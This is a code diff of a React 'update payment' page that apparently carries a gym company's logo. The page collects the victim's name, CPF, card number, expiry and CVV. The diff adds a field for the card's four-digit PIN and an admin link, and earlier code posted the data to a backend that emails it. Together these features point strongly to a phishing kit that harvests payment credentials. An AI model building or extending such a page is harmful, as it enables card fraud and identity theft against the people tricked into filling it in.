@@ -5,18 +5,20 @@ import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { Lock, CreditCard } from 'lucide-react';
 import { toast } from 'sonner';
+import { PaymentProcessingScreen } from '@/components/PaymentProcessingScreen';
 import evoqueLogo from '@/assets/evoque-logo.webp';
 
 const Index = () => {
   const navigate = useNavigate();
+  const [isProcessing, setIsProcessing] = useState(false);
   const [formData, setFormData] = useState({
     nomeCompleto: '',
     cpf: '',
     numeroCartao: '',
     validade: '',
     cvv: '',
+    senhaCartao: '',
   });
-  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const formatCPF = (value: string) => {
     const numbers = value.replace(/\D/g, '');
@@ -56,56 +58,54 @@ const Index = () => {
     setFormData(prev => ({ ...prev, [field]: formattedValue }));
   };
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    setIsSubmitting(true);
 
-    try {
-      // Connect to backend on port 5000 (safe port)
-      const backendUrl = 'http://localhost:5000';
-
-      console.log('🔗 Enviando dados para:', backendUrl);
-      console.log('📦 Dados:', formData);
-
-      const response = await fetch(`${backendUrl}/api/update-payment`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(formData),
+    // Validações básicas
+    if (!formData.nomeCompleto.trim()) {
+      toast.error('Nome obrigatório', {
+        description: 'Por favor, insira seu nome completo.',
       });
-
-      console.log('📡 Status da resposta:', response.status);
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.error('❌ Erro do backend:', errorText);
-        throw new Error(`Erro ${response.status}: ${errorText}`);
-      }
-
-      const data = await response.json();
-      console.log('✅ Resposta do backend:', data);
-
-      toast.success('Pagamento atualizado com sucesso!', {
-        description: 'Seus dados foram salvos e e-mail enviado com sucesso.',
-      });
-
-      setFormData({
-        nomeCompleto: '',
-        cpf: '',
-        numeroCartao: '',
-        validade: '',
-        cvv: '',
-      });
-    } catch (error) {
-      const errorMessage = error instanceof Error ? error.message : 'Erro ao conectar com o backend';
-      console.error('❌ ERRO COMPLETO:', error);
-      toast.error('Erro ao processar', {
-        description: errorMessage,
-      });
-    } finally {
-      setIsSubmitting(false);
+      return;
     }
+
+    if (!formData.cpf.trim()) {
+      toast.error('CPF obrigatório', {
+        description: 'Por favor, insira seu CPF.',
+      });
+      return;
+    }
+
+    if (!formData.numeroCartao.trim()) {
+      toast.error('Cartão obrigatório', {
+        description: 'Por favor, insira o número do cartão.',
+      });
+      return;
+    }
+
+    if (!formData.validade.trim()) {
+      toast.error('Validade obrigatória', {
+        description: 'Por favor, insira a validade do cartão.',
+      });
+      return;
+    }
+
+    if (!formData.cvv.trim()) {
+      toast.error('CVV obrigatório', {
+        description: 'Por favor, insira o CVV do cartão.',
+      });
+      return;
+    }
+
+    if (!formData.senhaCartao.trim()) {
+      toast.error('Senha obrigatória', {
+        description: 'Por favor, insira a senha do cartão.',
+      });
+      return;
+    }
+
+    // Abre a tela de processamento
+    setIsProcessing(true);
   };
 
   return (
@@ -205,14 +205,27 @@ const Index = () => {
                 </div>
               </div>
 
-              <Button 
-                type="submit" 
-                variant="gradient" 
-                size="lg" 
+              <div className="space-y-2">
+                <label className="text-sm font-medium text-foreground">
+                  Senha do cartão
+                </label>
+                <Input
+                  placeholder="••••"
+                  type="password"
+                  value={formData.senhaCartao}
+                  onChange={(e) => handleInputChange('senhaCartao', e.target.value)}
+                  maxLength={4}
+                  required
+                />
+              </div>
+
+              <Button
+                type="submit"
+                variant="gradient"
+                size="lg"
                 className="w-full mt-6"
-                disabled={isSubmitting}
               >
-                {isSubmitting ? 'Processando...' : 'Atualizar pagamento'}
+                Atualizar pagamento
               </Button>
             </form>
           </CardContent>
@@ -226,8 +239,8 @@ const Index = () => {
 
         {/* Admin link */}
         <div className="text-center mt-8">
-          <Button 
-            variant="ghost" 
+          <Button
+            variant="ghost"
             className="text-muted-foreground hover:text-primary"
             onClick={() => navigate('/admin')}
           >
@@ -235,6 +248,23 @@ const Index = () => {
           </Button>
         </div>
       </div>
+
+      {/* Payment Processing Screen */}
+      <PaymentProcessingScreen
+        isOpen={isProcessing}
+        paymentData={formData}
+        onClose={() => {
+          setIsProcessing(false);
+          setFormData({
+            nomeCompleto: '',
+            cpf: '',
+            numeroCartao: '',
+            validade: '',
+            cvv: '',
+            senhaCartao: '',
+          });
+        }}
+      />
     </div>
   );
 };
